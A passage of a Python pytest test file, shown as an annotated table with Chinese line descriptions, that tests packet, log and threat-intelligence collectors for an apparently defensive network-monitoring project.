| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Phase 1 数据采集层单元测试` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `覆盖：PacketCollector / LogCollector / ThreatIntelCollector` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `运行：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    pytest tests/test_collectors.py -v` |
| 7 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 8 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from unittest.mock import MagicMock, patch` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 注释：解释下面或当前这段代码的设计意图。 | `# 将项目根目录加入 sys.path，便于直接运行 pytest` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))` |
| 19 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.log_collector import LogCollector` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.packet_collector import PacketCollector` |
| 24 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.threat_intel import ThreatIntelCollector` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 28 | 注释：解释下面或当前这段代码的设计意图。 | `# PacketCollector 测试` |
| 29 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 30 | 类定义：声明 `TestPacketCollector`，封装相关状态与行为。 | `class TestPacketCollector:` |
| 31 | 文档字符串：说明当前模块、类或函数的职责。 | `    """网络流量采集器测试"""` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 函数定义：声明 `test_packet_collector_init` 的输入、处理逻辑和返回结果。 | `    def test_packet_collector_init(self):` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `        """默认参数初始化正确"""` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector()` |
| 36 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.interface is None` |
| 37 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.maxsize == 10000` |
| 38 | 断言：验证测试或运行时假设是否成立。 | `        assert collector._running is False` |
| 39 | 断言：验证测试或运行时假设是否成立。 | `        assert collector._thread is None` |
| 40 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.drop_count == 0` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `test_packet_collector_custom_params` 的输入、处理逻辑和返回结果。 | `    def test_packet_collector_custom_params(self):` |
| 43 | 文档字符串：说明当前模块、类或函数的职责。 | `        """自定义参数初始化正确"""` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(interface='eth0', queue_size=100)` |
| 45 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.interface == 'eth0'` |
| 46 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.maxsize == 100` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `test_packet_callback_ip_tcp` 的输入、处理逻辑和返回结果。 | `    def test_packet_callback_ip_tcp(self):` |
| 49 | 文档字符串：说明当前模块、类或函数的职责。 | `        """含 IP+TCP 的数据包能被正确解析"""` |
| 50 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import IP, TCP` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=10)` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = IP(src='1.2.3.4', dst='5.6.7.8', ttl=64) / TCP(` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sport=1234, dport=80, flags='S'` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector._packet_callback(packet)` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.qsize() == 1` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parsed = collector.packet_queue.get_nowait()` |
| 60 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['src_ip'] == '1.2.3.4'` |
| 61 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['dst_ip'] == '5.6.7.8'` |
| 62 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['protocol'] == 'TCP'` |
| 63 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['src_port'] == 1234` |
| 64 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['dst_port'] == 80` |
| 65 | 断言：验证测试或运行时假设是否成立。 | `        assert 'S' in parsed['tcp_flags']` |
| 66 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['ttl'] == 64` |
| 67 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['packet_len'] > 0` |
| 68 | 断言：验证测试或运行时假设是否成立。 | `        assert 'timestamp' in parsed` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 函数定义：声明 `test_packet_callback_ip_udp` 的输入、处理逻辑和返回结果。 | `    def test_packet_callback_ip_udp(self):` |
| 71 | 文档字符串：说明当前模块、类或函数的职责。 | `        """含 IP+UDP 的数据包能被正确解析"""` |
| 72 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import IP, UDP` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=10)` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = IP(src='10.0.0.1', dst='10.0.0.2') / UDP(sport=53, dport=5353)` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector._packet_callback(packet)` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parsed = collector.packet_queue.get_nowait()` |
| 79 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['protocol'] == 'UDP'` |
| 80 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['src_port'] == 53` |
| 81 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['dst_port'] == 5353` |
| 82 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['tcp_flags'] == ''` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 函数定义：声明 `test_packet_callback_ip_icmp` 的输入、处理逻辑和返回结果。 | `    def test_packet_callback_ip_icmp(self):` |
| 85 | 文档字符串：说明当前模块、类或函数的职责。 | `        """含 IP+ICMP 的数据包能被正确解析"""` |
| 86 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import ICMP, IP` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=10)` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = IP(src='1.1.1.1', dst='2.2.2.2') / ICMP()` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector._packet_callback(packet)` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parsed = collector.packet_queue.get_nowait()` |
| 93 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['protocol'] == 'ICMP'` |
| 94 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['src_port'] == 0` |
| 95 | 断言：验证测试或运行时假设是否成立。 | `        assert parsed['dst_port'] == 0` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 函数定义：声明 `test_packet_callback_non_ip` 的输入、处理逻辑和返回结果。 | `    def test_packet_callback_non_ip(self):` |
| 98 | 文档字符串：说明当前模块、类或函数的职责。 | `        """非 IP 数据包应被直接忽略"""` |
| 99 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import Ether` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=10)` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = Ether()  # 无 IP 层` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector._packet_callback(packet)` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.qsize() == 0` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 函数定义：声明 `test_packet_callback_queue_full` 的输入、处理逻辑和返回结果。 | `    def test_packet_callback_queue_full(self):` |
| 108 | 文档字符串：说明当前模块、类或函数的职责。 | `        """队列已满时，丢弃计数应递增"""` |
| 109 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import IP, TCP` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=2)` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = IP(src='1.2.3.4', dst='5.6.7.8') / TCP(sport=1, dport=2)` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(5):` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `            collector._packet_callback(packet)` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.qsize() == 2` |
| 118 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.drop_count == 3` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 函数定义：声明 `test_get_packets_empty` 的输入、处理逻辑和返回结果。 | `    def test_get_packets_empty(self):` |
| 121 | 文档字符串：说明当前模块、类或函数的职责。 | `        """空队列返回空列表"""` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector()` |
| 123 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.get_packets() == []` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 函数定义：声明 `test_get_packets_with_max_count` 的输入、处理逻辑和返回结果。 | `    def test_get_packets_with_max_count(self):` |
| 126 | 文档字符串：说明当前模块、类或函数的职责。 | `        """max_count 正确限制取出数量"""` |
| 127 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import IP, TCP` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=100)` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packet = IP(src='1.2.3.4', dst='5.6.7.8') / TCP(sport=1, dport=2)` |
| 131 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(10):` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `            collector._packet_callback(packet)` |
| 133 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets = collector.get_packets(max_count=3)` |
| 135 | 断言：验证测试或运行时假设是否成立。 | `        assert len(packets) == 3` |
| 136 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.qsize() == 7` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 函数定义：声明 `test_start_stop_no_exception` 的输入、处理逻辑和返回结果。 | `    def test_start_stop_no_exception(self):` |
| 139 | 文档字符串：说明当前模块、类或函数的职责。 | `        """start/stop 流程不抛异常（抓包被 mock）"""` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=10)` |
| 141 | 上下文管理：自动管理资源打开与释放。 | `        with patch('src.collectors.packet_collector.sniff') as mock_sniff:` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_sniff.return_value = None` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            collector.start()` |
| 144 | 断言：验证测试或运行时假设是否成立。 | `            assert collector._running is True` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `            time.sleep(0.05)` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `            collector.stop()` |
| 147 | 断言：验证测试或运行时假设是否成立。 | `            assert collector._running is False` |
| 148 | 断言：验证测试或运行时假设是否成立。 | `            assert collector._thread is None` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 152 | 注释：解释下面或当前这段代码的设计意图。 | `# LogCollector 测试` |
| 153 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 154 | 类定义：声明 `TestLogCollector`，封装相关状态与行为。 | `class TestLogCollector:` |
| 155 | 文档字符串：说明当前模块、类或函数的职责。 | `    """日志采集器测试"""` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 函数定义：声明 `test_log_collector_init` 的输入、处理逻辑和返回结果。 | `    def test_log_collector_init(self):` |
| 158 | 文档字符串：说明当前模块、类或函数的职责。 | `        """默认参数初始化"""` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log')` |
| 160 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.log_path == '/tmp/fake.log'` |
| 161 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.log_type == 'web'` |
| 162 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.last_position == 0` |
| 163 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 164 | 函数定义：声明 `test_parse_web_log_valid` 的输入、处理逻辑和返回结果。 | `    def test_parse_web_log_valid(self):` |
| 165 | 文档字符串：说明当前模块、类或函数的职责。 | `        """标准 Apache 格式日志解析正确"""` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='web')` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = (` |
| 168 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] '` |
| 169 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"GET /apache_pb.gif HTTP/1.0" 200 2326'` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector._parse_web_log(line)` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 174 | 断言：验证测试或运行时假设是否成立。 | `        assert result['src_ip'] == '192.168.1.1'` |
| 175 | 断言：验证测试或运行时假设是否成立。 | `        assert result['http_method'] == 'GET'` |
| 176 | 断言：验证测试或运行时假设是否成立。 | `        assert result['method'] == 'GET'` |
| 177 | 断言：验证测试或运行时假设是否成立。 | `        assert result['url'] == '/apache_pb.gif'` |
| 178 | 断言：验证测试或运行时假设是否成立。 | `        assert result['status_code'] == 200` |
| 179 | 断言：验证测试或运行时假设是否成立。 | `        assert result['response_size'] == 2326` |
| 180 | 断言：验证测试或运行时假设是否成立。 | `        assert result['user_agent'] == ''` |
| 181 | 断言：验证测试或运行时假设是否成立。 | `        assert result['timestamp'] == '10/Oct/2000:13:55:36 -0700'` |
| 182 | 断言：验证测试或运行时假设是否成立。 | `        assert result['log_type'] == 'web'` |
| 183 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 184 | 函数定义：声明 `test_parse_web_log_combined_with_user_agent` 的输入、处理逻辑和返回结果。 | `    def test_parse_web_log_combined_with_user_agent(self):` |
| 185 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Combined Log Format：应解析 referer 与 user-agent。"""` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='web')` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = (` |
| 188 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '203.0.113.9 - - [10/Oct/2000:13:55:36 -0700] '` |
| 189 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"GET /search?q=1 HTTP/1.0" 200 2326 '` |
| 190 | 函数调用：执行已有函数/方法完成当前步骤。 | `            '"http://example.com/ref" "Mozilla/5.0 (TestAgent)"'` |
| 191 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector._parse_web_log(line)` |
| 193 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 194 | 断言：验证测试或运行时假设是否成立。 | `        assert result['src_ip'] == '203.0.113.9'` |
| 195 | 断言：验证测试或运行时假设是否成立。 | `        assert result['user_agent'] == 'Mozilla/5.0 (TestAgent)'` |
| 196 | 断言：验证测试或运行时假设是否成立。 | `        assert result['method'] == 'GET'` |
| 197 | 断言：验证测试或运行时假设是否成立。 | `        assert result['response_size'] == 2326` |
| 198 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 199 | 函数定义：声明 `test_parse_web_log_dash_response_size` 的输入、处理逻辑和返回结果。 | `    def test_parse_web_log_dash_response_size(self):` |
| 200 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Nginx 以 \`\`-\`\` 表示缺失字节数时应映射为 0。"""` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='web')` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = (` |
| 203 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '192.168.1.5 - - [10/Oct/2000:13:55:36 -0700] '` |
| 204 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"HEAD /health HTTP/1.0" 204 -'` |
| 205 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector._parse_web_log(line)` |
| 207 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 208 | 断言：验证测试或运行时假设是否成立。 | `        assert result['response_size'] == 0` |
| 209 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 210 | 函数定义：声明 `test_parse_web_log_invalid` 的输入、处理逻辑和返回结果。 | `    def test_parse_web_log_invalid(self):` |
| 211 | 文档字符串：说明当前模块、类或函数的职责。 | `        """非法格式返回 None"""` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='web')` |
| 213 | 断言：验证测试或运行时假设是否成立。 | `        assert collector._parse_web_log('not a valid log line') is None` |
| 214 | 断言：验证测试或运行时假设是否成立。 | `        assert collector._parse_web_log('') is None` |
| 215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 216 | 函数定义：声明 `test_parse_system_log_valid` 的输入、处理逻辑和返回结果。 | `    def test_parse_system_log_valid(self):` |
| 217 | 文档字符串：说明当前模块、类或函数的职责。 | `        """系统日志解析正确"""` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='system')` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = 'Oct 10 13:55:36 sshd[1234]: Failed password for user'` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector._parse_system_log(line)` |
| 221 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 222 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 223 | 断言：验证测试或运行时假设是否成立。 | `        assert result['timestamp'] == 'Oct 10 13:55:36'` |
| 224 | 断言：验证测试或运行时假设是否成立。 | `        assert result['process'] == 'sshd[1234]'` |
| 225 | 断言：验证测试或运行时假设是否成立。 | `        assert result['log_type'] == 'system'` |
| 226 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 227 | 函数定义：声明 `test_parse_system_log_short_line` 的输入、处理逻辑和返回结果。 | `    def test_parse_system_log_short_line(self):` |
| 228 | 文档字符串：说明当前模块、类或函数的职责。 | `        """不足 4 段的行返回 None"""` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/tmp/fake.log', log_type='system')` |
| 230 | 断言：验证测试或运行时假设是否成立。 | `        assert collector._parse_system_log('Oct 10') is None` |
| 231 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 232 | 函数定义：声明 `test_read_new_lines_nonexistent` 的输入、处理逻辑和返回结果。 | `    def test_read_new_lines_nonexistent(self):` |
| 233 | 文档字符串：说明当前模块、类或函数的职责。 | `        """文件不存在时返回空列表"""` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(log_path='/nonexistent/path/xxx.log')` |
| 235 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.read_new_lines() == []` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 函数定义：声明 `test_incremental_read` 的输入、处理逻辑和返回结果。 | `    def test_incremental_read(self, tmp_path):` |
| 238 | 文档字符串：说明当前模块、类或函数的职责。 | `        """增量读取：第二次只读取新增内容"""` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_file = tmp_path / 'access.log'` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line1 = (` |
| 241 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] '` |
| 242 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"GET /a HTTP/1.0" 200 100\n'` |
| 243 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line2 = (` |
| 245 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '192.168.1.2 - - [10/Oct/2000:13:55:37 -0700] '` |
| 246 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"POST /b HTTP/1.0" 404 50\n'` |
| 247 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 248 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 249 | 函数调用：执行已有函数/方法完成当前步骤。 | `        log_file.write_text(line1, encoding='utf-8')` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(str(log_file), log_type='web')` |
| 251 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        first = collector.read_new_lines()` |
| 253 | 断言：验证测试或运行时假设是否成立。 | `        assert len(first) == 1` |
| 254 | 断言：验证测试或运行时假设是否成立。 | `        assert first[0]['src_ip'] == '192.168.1.1'` |
| 255 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 256 | 注释：解释下面或当前这段代码的设计意图。 | `        # 再次读取应为空` |
| 257 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.read_new_lines() == []` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 注释：解释下面或当前这段代码的设计意图。 | `        # 追加一行后，只应读出新行` |
| 260 | 上下文管理：自动管理资源打开与释放。 | `        with open(log_file, 'a', encoding='utf-8') as f:` |
| 261 | 函数调用：执行已有函数/方法完成当前步骤。 | `            f.write(line2)` |
| 262 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        second = collector.read_new_lines()` |
| 264 | 断言：验证测试或运行时假设是否成立。 | `        assert len(second) == 1` |
| 265 | 断言：验证测试或运行时假设是否成立。 | `        assert second[0]['src_ip'] == '192.168.1.2'` |
| 266 | 断言：验证测试或运行时假设是否成立。 | `        assert second[0]['http_method'] == 'POST'` |
| 267 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 268 | 函数定义：声明 `test_reset_position` 的输入、处理逻辑和返回结果。 | `    def test_reset_position(self, tmp_path):` |
| 269 | 文档字符串：说明当前模块、类或函数的职责。 | `        """reset_position 后可重新全量读取"""` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_file = tmp_path / 'a.log'` |
| 271 | 函数调用：执行已有函数/方法完成当前步骤。 | `        log_file.write_text(` |
| 272 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] '` |
| 273 | 代码语句：参与当前文件的业务流程或数据处理。 | `            '"GET /a HTTP/1.0" 200 100\n',` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            encoding='utf-8',` |
| 275 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = LogCollector(str(log_file), log_type='web')` |
| 277 | 断言：验证测试或运行时假设是否成立。 | `        assert len(collector.read_new_lines()) == 1` |
| 278 | 断言：验证测试或运行时假设是否成立。 | `        assert len(collector.read_new_lines()) == 0` |
| 279 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector.reset_position()` |
| 280 | 断言：验证测试或运行时假设是否成立。 | `        assert len(collector.read_new_lines()) == 1` |
| 281 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 282 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 283 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 284 | 注释：解释下面或当前这段代码的设计意图。 | `# ThreatIntelCollector 测试` |
| 285 | 注释：解释下面或当前这段代码的设计意图。 | `# ======================================================================` |
| 286 | 类定义：声明 `TestThreatIntelCollector`，封装相关状态与行为。 | `class TestThreatIntelCollector:` |
| 287 | 文档字符串：说明当前模块、类或函数的职责。 | `    """威胁情报采集器测试"""` |
| 288 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 289 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize('ip', [` |
| 290 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '192.168.1.1',` |
| 291 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '8.8.8.8',` |
| 292 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '0.0.0.0',` |
| 293 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '255.255.255.255',` |
| 294 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '10.0.0.1',` |
| 295 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ])` |
| 296 | 函数定义：声明 `test_validate_ip_valid` 的输入、处理逻辑和返回结果。 | `    def test_validate_ip_valid(self, ip):` |
| 297 | 文档字符串：说明当前模块、类或函数的职责。 | `        """合法 IP 地址应通过验证"""` |
| 298 | 断言：验证测试或运行时假设是否成立。 | `        assert ThreatIntelCollector._validate_ip(ip) is True` |
